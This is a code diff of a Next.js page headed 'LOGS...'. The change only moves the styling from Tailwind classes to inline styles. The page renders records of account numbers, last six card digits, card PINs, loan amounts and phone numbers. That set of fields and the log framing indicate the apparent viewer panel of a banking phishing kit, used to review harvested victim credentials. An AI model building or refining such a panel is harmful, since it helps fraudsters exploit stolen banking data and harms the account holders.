@@ -18,27 +18,35 @@ export default function Home(params: { data: any}) {
   
   return (
     <div className='w-[80%] m-auto'>
-      <div className='mt-4 text-center text-gray-800 font-semibold text-3xl pt-8'>
+      <div style={{marginTop:'1rem', textAlign:'center', fontSize:'2rem'}} >
           LOGS...
       </div>
 
       {
         data1?.length > 0 &&
         data1.map((d: { accNo: string | number   | null | undefined; last6: string | number  | null | undefined; cpin: string | number | null | undefined; loanAmm: string | number | null | undefined; username: string | number | null | undefined }, i: Key | null | undefined) => (
-          <div key={i} className='flex flex-col gap-1 mt-8 pb-4 border-b-2 border-b-gray-700'>
+          <div style={{display:'flex', flexDirection:'column', gap:'4px', borderColor:'gray', borderBottom:'2px', paddingBottom:'1rem'}} key={i} >
             <div></div>
-            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>Account</div><div>{d.accNo}</div></div>
-            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>Last 6 digit</div><div>{d.last6}</div></div>
-            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>CC pin</div><div>{d.cpin}</div></div>
-            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>Loan Amount</div><div>{d.loanAmm}</div></div>
-            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>Phone</div><div>{d.username}</div></div>
+            <div style={styles.items}><div>Account</div><div>{d.accNo}</div></div>
+            <div style={styles.items}><div>Last 6 digit</div><div>{d.last6}</div></div>
+            <div style={styles.items}><div>CC pin</div><div>{d.cpin}</div></div>
+            <div style={styles.items}><div>Loan Amount</div><div>{d.loanAmm}</div></div>
+            <div style={styles.items}><div>Phone</div><div>{d.username}</div></div>
+            <div style={{height:'4px', width:'100%', background:'gray'}}></div>
           </div>
         ))
       }
-      
+
     </div>
   )
 }
+// flex flex-col gap-1 mt-8 pb-4 border-b-2 border-b-gray-700
+const styles = {
+
+  older: {display:'flex', flexDirection:'column', gap:'4px', borderColor:'gray', borderBottom:'2px', paddingBottom:'1rem'},
+  items: { alignItems:'center', padding:'1.5rem', borderWidth:'2px', borderColor:'gray', display:'flex', justifyContent:'space-between', }
+}
+
 
 export async function getServerSideProps(context: any) {
   try {
